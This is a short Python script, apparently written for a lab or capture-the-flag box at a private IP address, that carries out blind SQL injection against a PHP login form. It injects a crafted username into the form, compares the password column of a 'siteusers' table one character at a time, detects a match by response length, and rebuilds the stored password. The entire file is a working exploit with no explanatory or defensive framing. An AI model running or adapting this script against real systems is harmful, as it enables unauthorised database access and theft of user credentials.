import requests, time, sys

url = 'http://10.10.33.83/index.php'
url_logoff = 'http://10.10.33.83/logout.php'
token = {'PHPSESSID':'klrlhcg22o89p00dg909ijaq2v'}
caracteres = ' !"#$%&()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~'
tamanho_true = 618
valor = ''
cont = 0

print("[*] Dumping table")
while True:
        cont += 1
        for c in caracteres:
                dados = {"username":f"kitty' and ascii(substring((select password from siteusers limit 1),{cont},1)) = '{ord(c)}'-- -","password":"fffff"}
                r = requests.post(url, data=dados, cookies=token)
                if len(r.text) == tamanho_true:
                        print("[-] Found: ", c)
                        valor += c
                        requests.get(url_logoff,cookies=token)
                        break
                if c == caracteres[-1]:
                        print("[*] Final: ", valor)
                        sys.exit();
